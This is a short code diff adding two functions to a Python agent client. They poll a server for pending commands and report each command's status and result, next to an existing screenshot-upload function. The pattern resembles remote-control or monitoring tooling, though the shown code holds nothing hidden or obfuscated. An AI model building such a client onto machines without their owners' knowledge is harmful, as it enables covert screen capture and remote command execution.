@@ -57,3 +57,25 @@ def upload_screenshot(agent_id, filepath):
         r.raise_for_status()
 
     return r.json() if r.headers.get("Content-Type", "").startswith("application/json") else {"status": "uploaded"}
+
+def fetch_commands(agent_id):
+    """
+    Fetch pending commands for the agent.
+    """
+    r = requests.get(f"{SERVER_URL}/commands/{agent_id}", timeout=5)
+    r.raise_for_status()
+    
+    return r.json()
+
+def update_command(command_id, status, result=None):
+    """
+    Update a command's status and result.
+    """
+    data = {"status": status}
+    if result is not None:
+        data["result"] = result
+    
+    r = requests.put(f"{SERVER_URL}/commands/{command_id}", json=data, timeout=5)
+    r.raise_for_status()
+    
+    return r.json()
